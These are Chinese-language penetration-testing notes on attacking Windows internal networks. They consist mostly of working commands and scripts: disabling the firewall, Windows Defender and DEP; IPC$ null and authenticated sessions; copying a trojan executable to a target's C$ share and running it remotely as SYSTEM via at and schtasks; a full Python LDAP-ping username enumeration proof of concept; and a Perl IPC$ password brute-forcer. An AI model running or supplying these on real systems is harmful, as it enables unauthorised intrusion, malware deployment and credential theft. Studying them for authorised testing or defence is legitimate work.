# windows内网渗透

## 查看系统信息



### 查看开放端口



netstat -an

我们拿其中一行来解释吧：

Proto Local Address     Foreign Address    State

TCP  Eagle:2929       219.137.227.10:4899  ESTABLISHED

 

协议（Proto ）：TCP ，指是传输层通讯协议
本地机器名（Local Address ）：Eagle ，俗称计算机名了，安装系统时设置的，可以在“我的电脑”属性中修改，本地打开并用于连接的端口：2929 ） 
远程机器名（Foreign Address ）： 219.137.227.10
远程端口： 4899 
状态：ESTABLISHED 

 

**状态列表**

LISTEN  ：在监听状态中。  
ESTABLISHED ：已建立联机的联机情况。 
TIME_WAIT ：该联机在目前已经是等待的状态。 



### 查看自己内网ip

ping ceye的dns服务

## 常用命令

```shell
chcp 65001 #解决乱码
netsh advfirewall set allprofiles state off#关闭防火墙
net stop windefend#关闭windefebd
bcdedit.exe /set{current} nx AlwaysOff# 关闭dep

```



## ipc$空连接

### 什么是ipc$

 **IPC$** (Internet Process Connection) , 是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。 

为了配合IPC共享工作，Windows操作系统（不包括Windows 98系列）在安装完成后，自动设置共享的目录为：C盘、D盘、E盘、ADMIN目录（C:\Windows）等，即为ADMIN$、C$、D$、E$等，但要注意，这些共享是隐藏的，只有管理员能够对他们进行远程操作。



### ipc空连接

`net use \\100.100.1.8 /u:"" ""`

空会话是在没有信任的情况下与服务器建立的会话（即未提供用户名与密码）。那么建立空会话到底可以做什么呢？
利用IPC$，黑客甚至可以与目标主机建立一个空的连接，而无需用户名与密码(当然,对方机器必须开了ipc$共享,否则你是连接不上的)，而利用这个空的连接，连接者还可以得到目标主机上的用户列表(不过负责的管理员会禁止导出用户列表的)。建立了一个空的连接后,黑客可以获得不少的信息(而这些信息往往是入侵中必不可少的),访问部分共享,如果黑客能够以某一个具有一定权限的用户身份登陆的话,那么就会得到相应的权限。



### 如何利用



#### 利用条件

开启445或者139端口

开启ipc$



#### 导出用户列表



#### IPC$反弹shell

```
net use \\192.168.10.15\ipc$ /u:"administrator" "root"     #以administrator用户建立ipc$连接
copy c:\users\xie\desktop\vps.exe \\192.168.10.15\c$       #复制本地指定目录的木马文件到目标的C盘下
net time \\192.168.10.15                                   #查看目标主机的时间
at \\192.168.10.15 11:30:00 c:\vps.exe                     #指定时间执行目标主机指定目录的程序
```



```shell
schtasks /create /tn "plugin_update" /tr c:\windows\temp\plugin_update.exe /sc once /st 10:29 /S 192.168.3.168 /RU System  /u administrator /p "admin!@#45" 

schtasks /run /tn "plugin_update" /S 192.168.3.168  /u administrator /p "admin!@#45" 

schtasks /F /delete /tn "plugin_update" /S 192.168.3.168 /u administrator /p "admin!@#45
```



#### 用户名列举

```python
#!/usr/bin/python2

#https://msdn.microsoft.com/en-us/library/cc223811.aspx
#https://github.com/samba-team/samba/blob/master/examples/misc/cldap.pl
#https://github.com/eerimoq/asn1tools/blob/master/tests/files/ietf/rfc4511.asn

from __future__ import print_function
from binascii import hexlify
import asn1tools
import socket
import sys

print ("UserEnum LDAP Ping POC - Reino Mostert/SensePost 2018")
if len(sys.argv)!=4:
        print ("Usage:   python UserEnum_LDAP.py DomainControlerIP DNSDomainName Userlist")
        print ("Example: python UserEnum_LDAP.py 192.168.1.10 Contoso.com userlist.txt")
        sys.exit()

SPECIFICATION = '''
Foo DEFINITIONS IMPLICIT TAGS ::= BEGIN
LDAPMessage3 ::= SEQUENCE {
     messageID       INTEGER,
     protocolOp	    [APPLICATION 3] SEQUENCE {
     						baseObject    OCTET STRING,
     						scope           ENUMERATED {
     						     baseObject              (0),
     						     singleLevel             (1),
     						     wholeSubtree            (2),
     						     ...
     						},
     						derefAliases    ENUMERATED {
     						     neverDerefAliases       (0),
     						     derefInSearching        (1),
     						     derefFindingBaseObj     (2),
     						     derefAlways             (3)
     						},
     						sizeLimit       INTEGER,
     						timeLimit       INTEGER,
     						typesOnly       BOOLEAN,
						filters [0] SEQUENCE {
								filterDomain [3]  SEQUENCE {
								        dnsdomattr OCTET STRING,
								        dnsdomval  OCTET STRING
								},
								filterVersion  [3] SEQUENCE {
								        ntverattr OCTET STRING,
								        ntverval  OCTET STRING
								},
								filterUser [3] SEQUENCE {
								        userattr OCTET STRING,
								       	userval OCTET STRING
								},
								filterAAC [3] SEQUENCE {
								        aacattr OCTET STRING,
								        aacval  OCTET STRING
								}
						},
						returntype SEQUENCE {
							netlogon OCTET STRING
						}
					    }
}
END
'''

response='''
Bar DEFINITIONS IMPLICIT TAGS ::= BEGIN
LDAPMessage4 ::=
SEQUENCE
{
	messageID       INTEGER,
	protocolOp [APPLICATION 4] SEQUENCE
  	{
 		objectName      OCTET STRING,
  		attributes      SEQUENCE
		{
			partialAttribute SEQUENCE
			{
				type OCTET STRING,
				vals SET {
					value OCTET STRING
				    }
			}
		}
	}
}
LDAPMessage5 ::= SEQUENCE {
     	messageID       INTEGER,
     	protocolOp [APPLICATION 5] SEQUENCE {
    		resultCode         ENUMERATED {
        		success                      (0),
       			operationsError              (1)
			},
     		 matchedDN          OCTET STRING,
    		 diagnosticMessage  OCTET STRING
     }
}
END
'''


request_asn = asn1tools.compile_string(SPECIFICATION,'ber')
response_asn = asn1tools.compile_string(response,'ber')

f=open(sys.argv[3])
usernames=f.readlines();
f.close()

filterDomain = { 'dnsdomattr':'DnsDomain', 'dnsdomval':sys.argv[2] }
filterVersion = { 'ntverattr':'NtVer' , 'ntverval':'\x03\x00\x00\x00'  }
filterUser = { 'userattr':'User', 'userval':''}
filterAAC = { 'aacattr':'AAC' , 'aacval':'\x10\x00\x00\x00' }
filters = { 'filterDomain':filterDomain,'filterVersion':filterVersion,'filterUser':filterUser,'filterAAC':filterAAC}
returntype= {'netlogon':'Netlogon'}
packet= { 'baseObject':'', 'scope': 'baseObject','derefAliases': 'neverDerefAliases','sizeLimit':0, 'timeLimit':0, 'typesOnly':0,'returntype':returntype,'filters':filters}
message = {'messageID':0, 'protocolOp':packet}

print ("[*] Starting ...")
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(5.0)
for user in usernames:
	user=user.rstrip();
	message['protocolOp']['filters']['filterUser']['userval']=user
	encoded = request_asn.encode('LDAPMessage3',message)
	try:
		s.sendto(encoded, (sys.argv[1], 389))
		d = s.recvfrom(1024)
		reply = d[0]
		addr = d[1]
		result=response_asn.decode('LDAPMessage4',reply)['protocolOp']['attributes']['partialAttribute']['vals']['value'][0]
		if result==19:
			print ("[+] " +user + " exist")
	except asn1tools.codecs.DecodeTagError:
		print ('[-] Error in decoding packet. This sometimes happen if the wrong domain name has been supplied. Ensure that its the FQDN, e.g. Contoso.com, and not just Contoso.')
		pass
	except socket.error as msg:
		print ('[-] Error sending/receiving packets: '  + str(msg))
		pass
		#sys.exit()
print ("[*] Done ")
```





#### 爆破密码

`perl ipc$crack.pl <target ip > <account name> `

```perl
# IPC$crack
# Created by Mnemonix 1st of May 1998
$victim = $ARGV[0];$user = $ARGV[1];
open (OUTPUT, ">c:\net.txt");
open (PASSWORD, "c:\passwd.txt");
$passwd = <PASSWORD>;
while ($passwd ne "")
{
      chop ($passwd);
      $line = system ("net use \\\\$victim\\ipc\$ $passwd /user:$user");
      if ($line eq "0")
      {
      	print OUTPUT ("$user\'s password on $victim is $passwd.");
      	$passwd="";
      }
      else
      {
      	$passwd = <PASSWORD>;
      	if ($passwd eq "")
      		print OUTPUT ("Not cracked.");
      }
      
}

```





### 常用命令

```shell
net use                               #查看连接
net share                             #查看本地开启的共享
net share ipc$                        #开启ipc$共享
net share ipc$ /del                   #删除ipc$共享
net share c$ /del                     #删除C盘共享
 
 
net use \\192.168.10.15                   #与192.168.10.15建立ipc空连接
net use \\192.168.10.15\ipc$              #与192.168.10.15建立ipc空连接
net use \\192.168.10.15\ipc$ /u:"" ""     #与192.168.10.15建立ipc空连接
 
net use \\192.168.10.15 /u:"administrator" "root"   #以administrator身份与192.168.10.15建立ipc连接
net use \\192.168.10.15 /del              #删除ipc连接
 
net time \\192.168.10.15                  #查看该主机上的时间
 
net use \\192.168.10.15\c$  /u:"administrator" "root"  #建立C盘共享
dir \\192.168.10.15\c$                  #查看192.168.10.15C盘文件
dir \\192.168.10.15\c$\user             #查看192.168.10.15C盘文件下的user目录
dir \\192.168.10.15\c$\user\test.exe    #查看192.168.10.15C盘文件下的user目录下的test.exe文件
net use \\192.168.10.15\c$  /del        #删除该C盘共享连接
 
net use k: \\192.168.10.15\c$  /u:"administrator" "root"  #将目标C盘映射到本地K盘
net use k: /del                                           #删除该映射
```

